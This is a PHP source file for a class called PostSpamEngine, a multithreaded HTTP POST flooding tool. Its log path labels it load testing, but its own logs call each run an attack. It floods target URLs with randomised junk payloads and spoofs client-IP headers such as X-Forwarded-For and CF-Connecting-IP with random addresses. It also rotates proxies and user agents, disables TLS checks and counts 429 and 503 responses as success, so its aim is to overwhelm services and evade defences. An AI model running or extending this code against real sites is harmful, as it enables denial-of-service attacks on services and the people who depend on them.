<?php

class PostSpamEngine {
    private $db;
    private $config;
    private $stealthEngine;
    
    public function __construct($database, $config = []) {
        $this->db = $database;
        $this->config = array_merge($this->getDefaultConfig(), $config);
        $this->stealthEngine = null;
    }
    
    public function getDefaultConfig() {
        return [
            'method' => 'POST',
            'threads' => 50,
            'duration' => 300,
            'request_rate' => 100,
            'payload_size' => 1024,
            'content_type' => 'application/json',
            'stealth_enabled' => true,
            'proxy_rotation' => true,
            'ua_rotation' => true,
            'header_spoofing' => true,
            'payload_randomization' => true
        ];
    }
    
    public function start($groupId, $targets, $profile) {
        $this->logMessage("Starting POST-spam attack for group: $groupId");
        
        if ($this->config['stealth_enabled']) {
            $this->initializeStealth($groupId);
        }
        
        $attackResults = [];
        
        foreach ($targets as $target) {
            $targetResult = $this->attackTarget($target, $groupId, $profile);
            $attackResults[] = $targetResult;
        }
        
        return [
            'attack_method' => 'post-spam',
            'group_id' => $groupId,
            'targets' => count($targets),
            'results' => $attackResults,
            'config' => $this->config
        ];
    }
    
    private function attackTarget($target, $groupId, $profile) {
        $this->logMessage("POST-spam attack on target: $target");
        
        $startTime = time();
        $endTime = $startTime + $this->config['duration'];
        $requestCount = 0;
        $successCount = 0;
        $errorCodes = [];
        
        while (time() < $endTime) {
            $batchResults = $this->executeBatch($target, $groupId, $profile);
            
            $requestCount += $batchResults['requests'];
            $successCount += $batchResults['success'];
            
            foreach ($batchResults['error_codes'] as $code => $count) {
                $errorCodes[$code] = ($errorCodes[$code] ?? 0) + $count;
            }
            
            if ($this->config['stealth_enabled'] && $requestCount % 100 === 0) {
                $this->rotateStealthComponents($groupId);
            }
            
            usleep(1000000 / $this->config['request_rate']);
        }
        
        $duration = time() - $startTime;
        $rps = $duration > 0 ? round($requestCount / $duration, 2) : 0;
        
        $this->logMessage("POST-spam completed for $target: $requestCount requests, $successCount success, RPS: $rps");
        
        return [
            'target' => $target,
            'duration' => $duration,
            'total_requests' => $requestCount,
            'successful_requests' => $successCount,
            'error_codes' => $errorCodes,
            'rps' => $rps,
            'success_rate' => $requestCount > 0 ? round(($successCount / $requestCount) * 100, 2) : 0
        ];
    }
    
    private function executeBatch($target, $groupId, $profile) {
        $batchSize = $this->config['threads'];
        $requests = 0;
        $success = 0;
        $errorCodes = [];
        
        for ($i = 0; $i < $batchSize; $i++) {
            $result = $this->executePostRequest($target, $groupId, $profile);
            $requests++;
            
            if ($result['success']) {
                $success++;
            }
            
            $code = $result['http_code'];
            $errorCodes[$code] = ($errorCodes[$code] ?? 0) + 1;
        }
        
        return [
            'requests' => $requests,
            'success' => $success,
            'error_codes' => $errorCodes
        ];
    }
    
    private function executePostRequest($target, $groupId, $profile) {
        $headers = $this->generateHeaders($target, $profile);
        $payload = $this->generatePayload();
        $proxy = $this->getProxy();
        
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $target,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_CONNECTTIMEOUT => 5,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT => $this->getUserAgent()
        ]);
        
        if ($proxy && $this->config['proxy_rotation']) {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }
        
        $startTime = microtime(true);
        $response = curl_exec($ch);
        $responseTime = round((microtime(true) - $startTime) * 1000);
        
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        
        curl_close($ch);
        
        $success = ($httpCode >= 200 && $httpCode < 300) || in_array($httpCode, [403, 404, 429, 503, 524]);
        
        if (!$success && $error) {
            $this->logMessage("POST request error for $target: $error");
        }
        
        return [
            'success' => $success,
            'http_code' => $httpCode,
            'response_time' => $responseTime,
            'error' => $error
        ];
    }
    
    private function generateHeaders($target, $profile) {
        $baseHeaders = [
            'Content-Type: ' . $this->config['content_type'],
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Accept-Encoding: gzip, deflate, br',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            'Pragma: no-cache'
        ];
        
        if ($this->config['header_spoofing']) {
            $spoofedHeaders = $this->generateSpoofedHeaders($target);
            foreach ($spoofedHeaders as $key => $value) {
                $baseHeaders[] = "$key: $value";
            }
        }
        
        return $baseHeaders;
    }
    
    private function generatePayload() {
        if (!$this->config['payload_randomization']) {
            return json_encode(['data' => str_repeat('A', $this->config['payload_size'])]);
        }
        
        $payloadTypes = ['json', 'form', 'xml', 'binary'];
        $type = $payloadTypes[array_rand($payloadTypes)];
        
        switch ($type) {
            case 'json':
                return json_encode([
                    'id' => rand(1000, 9999),
                    'data' => $this->generateRandomString($this->config['payload_size']),
                    'timestamp' => time(),
                    'type' => 'load_test'
                ]);
                
            case 'form':
                return http_build_query([
                    'field1' => $this->generateRandomString(100),
                    'field2' => $this->generateRandomString(200),
                    'field3' => $this->generateRandomString($this->config['payload_size'] - 300)
                ]);
                
            case 'xml':
                $data = $this->generateRandomString($this->config['payload_size'] - 100);
                return "<?xml version=\"1.0\"?><root><data>$data</data></root>";
                
            case 'binary':
            default:
                return $this->generateRandomString($this->config['payload_size']);
        }
    }
    
    private function generateRandomString($length) {
        $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $string = '';
        for ($i = 0; $i < $length; $i++) {
            $string .= $characters[rand(0, strlen($characters) - 1)];
        }
        return $string;
    }
    
    private function generateSpoofedHeaders($target) {
        return [
            'X-Forwarded-For' => $this->generateRandomIP(),
            'X-Real-IP' => $this->generateRandomIP(),
            'X-Originating-IP' => $this->generateRandomIP(),
            'X-Remote-IP' => $this->generateRandomIP(),
            'X-Forwarded-Host' => parse_url($target, PHP_URL_HOST),
            'X-Forwarded-Proto' => 'https',
            'CF-Connecting-IP' => $this->generateRandomIP(),
            'True-Client-IP' => $this->generateRandomIP()
        ];
    }
    
    private function generateRandomIP() {
        return rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254) . '.' . rand(1, 254);
    }
    
    private function getUserAgent() {
        if (!$this->config['ua_rotation']) {
            return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
        }
        
        $userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        ];
        
        return $userAgents[array_rand($userAgents)];
    }
    
    private function getProxy() {
        if (!$this->config['proxy_rotation'] || !$this->db) {
            return null;
        }
        
        $proxies = $this->db->getActiveProxies(1);
        if (!empty($proxies)) {
            $proxy = $proxies[0];
            return $proxy['ip_address'] . ':' . $proxy['port'];
        }
        
        return null;
    }
    
    private function initializeStealth($groupId) {
        $this->logMessage("Initializing stealth components for group: $groupId");
        
        try {
            $stealthUrl = '/api/stealth_engine.php';
            $stealthData = json_encode([
                'action' => 'start_session',
                'group_id' => $groupId,
                'stealth_profile_id' => 1,
                'rotation_config' => [
                    'proxy_rotation' => $this->config['proxy_rotation'],
                    'ua_rotation' => $this->config['ua_rotation'],
                    'header_spoofing' => $this->config['header_spoofing']
                ]
            ]);
            
            $this->stealthEngine = true;
        } catch (Exception $e) {
            $this->logMessage("Failed to initialize stealth engine: " . $e->getMessage());
        }
    }
    
    private function rotateStealthComponents($groupId) {
        if (!$this->stealthEngine) {
            return;
        }
        
        try {
            $rotationTypes = ['proxy', 'user_agent', 'tls'];
            $rotationType = $rotationTypes[array_rand($rotationTypes)];
            
            $this->logMessage("Rotating stealth component: $rotationType for group: $groupId");
        } catch (Exception $e) {
            $this->logMessage("Failed to rotate stealth components: " . $e->getMessage());
        }
    }
    
    private function logMessage($message) {
        $logFile = '/home/ftcceelg/load_testing_system/logs/backend.log';
        $logDir = dirname($logFile);
        if (!is_dir($logDir)) {
            mkdir($logDir, 0755, true);
        }
        $timestamp = date('Y-m-d H:i:s');
        file_put_contents($logFile, "[$timestamp] POST_SPAM: $message\n", FILE_APPEND | LOCK_EX);
    }
}
?>
